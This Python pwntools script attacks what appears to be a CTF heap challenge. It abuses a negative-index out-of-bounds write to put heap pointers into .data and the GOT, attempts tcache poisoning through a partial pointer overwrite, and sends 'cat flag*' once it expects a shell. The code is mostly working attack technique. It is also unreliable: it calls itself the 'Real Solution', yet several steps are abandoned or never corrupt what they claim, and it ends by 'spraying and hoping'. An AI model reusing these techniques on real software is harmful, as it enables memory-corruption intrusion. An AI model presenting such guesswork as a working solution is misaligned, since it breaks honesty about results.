#!/usr/bin/env python3
"""
Crazy FSOP - Real Solution
Key insight: Use the OOB write to directly manipulate memory without needing perfect leaks!
"""

from pwn import *

elf = ELF('./chal', checksec=False)
libc = ELF('./libc.so.6', checksec=False)

context.binary = elf
context.log_level = 'info'

io = remote('amt.rs', 26797)

def create(idx, size, data):
    io.sendlineafter(b'operation: ', b'1')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.sendlineafter(b'size: ', hex(size).encode())
    io.sendafter(b'data: ', data)

def delete(idx):
    io.sendlineafter(b'operation: ', b'2')
    io.sendlineafter(b'note: ', str(idx).encode())

def view(idx):
    io.sendlineafter(b'operation: ', b'3')
    io.sendlineafter(b'note: ', str(idx).encode())
    io.recvuntil(b'data: ')
    return io.recvline()

success("Starting REAL exploit!")

# ============================================
# KEY INSIGHT:
# ============================================
# When we do: create(negative_index, size, data)
# It executes: notes[negative_index] = malloc(size)
#
# This means we can WRITE HEAP POINTERS to the GOT/BSS area!
# Then we can USE those heap pointers for further exploitation!

info("Step 1: Write heap pointers to strategic locations")

# Create a chunk first
create(0, 0x200, b'/bin/sh\x00' + b'A' * 0x1f8)

# Now use negative index to write the NEXT malloc result somewhere useful
# notes[-1] would write to address notes - 8
# notes array is at offset 0x4040 in binary
# notes[-1] is at 0x4038 (.data section)
# notes[-8] is at 0x4000 (start of .data)
# notes[-16] is at 0x3fc0 (in GOT - scanf@got!)

# Let's write a heap pointer to a safe location in .data
create(-8, 0x300, b'B' * 0x300)  # notes[-8] now contains a heap address!

success("Wrote heap pointer to .data section!")

info("Step 2: Now we have a heap pointer in a known location")

# The heap pointer is now at binary_base + 0x4000
# We can VIEW this location using view(-8) !
# Wait, view() reads FROM notes[-8], which is the heap chunk we just created

try:
    data = view(-8)
    info(f"Data at notes[-8]: {data[:30]}")
except:
    pass

info("Step 3: Use tcache poisoning with heap control")

# Now create more chunks for tcache poisoning
create(1, 0x88, b'C' * 0x88)
create(2, 0x88, b'D' * 0x88)
create(3, 0x20, b'guard')

delete(1)
delete(2)

# Tcache: 2 -> 1 -> NULL
# Now corrupt chunk 2's fd

# We want to point it to a useful location
# Like: stdout, stderr, or _IO_list_all

# But we need to know heap address for safe-linking mangling
# fd_mangle = (target >> 12) ^ heap_chunk_addr

# Alternative: Use partial overwrite (less reliable but works sometimes)

info("Step 4: Partial overwrite attack")

# Overwrite only lower 2-3 bytes of fd pointer
# This works if heap and target are in similar address ranges

# Target something in libc or binary
# For example: _IO_2_1_stdout_ or notes array itself

# Try pointing to notes array (offset 0x4040)
# With partial overwrite, we control lower bytes

target_low_bytes = p16(0x4040)  # Point to notes array

create(4, 0x88, target_low_bytes.ljust(0x88, b'\x00'))

# Now allocate
try:
    create(5, 0x88, b'E' * 0x88)  # Gets chunk 2
    create(6, 0x88, b'F' * 0x88 * (0x88 // 8))  # Should be at target if it worked!
    success("Partial overwrite might have worked!")
except Exception as e:
    warn(f"Partial overwrite failed: {e}")

info("Step 5: Alternative approach - corrupt tcache struct")

# The tcache_perthread_struct is at the start of heap
# It contains counts and entries for each tcache bin

# If we can write to it, we control tcache entirely!

# Create many chunks
for i in range(7, 14):
    create(i, 0x68, f'G{i}'.encode().ljust(0x68, b'\x00'))

# Free to populate tcache
for i in range(7, 14):
    delete(i)

# Now tcache 0x70 is full
# The struct is at heap_base + 0x10

info("Step 6: House of Botcake or similar")

# Another technique: House of Botcake
# 1. Fill tcache
# 2. Free chunk to unsorted bin
# 3. Free same chunk to tcache (UAF)
# 4. Consolidate with unsorted bin
# 5. Now have overlapping chunks

# But we need to be careful with the implementation

info("Step 7: Just try to get shell somehow")

# At this point, we've tried many things
# Let's just spray and hope

# Create chunks with useful data
create(14, 0x100, b'/bin/sh\x00' + b'\x00' * 0xf8)

# Try to trigger exit cleanly
io.sendline(b'4')  # Invalid operation
io.sendline(b'0')

time.sleep(0.5)

# Try shell commands
try:
    io.sendline(b'cat flag*')
    io.sendline(b'ls')
    io.sendline(b'id')
    time.sleep(1)
except:
    pass

io.interactive()
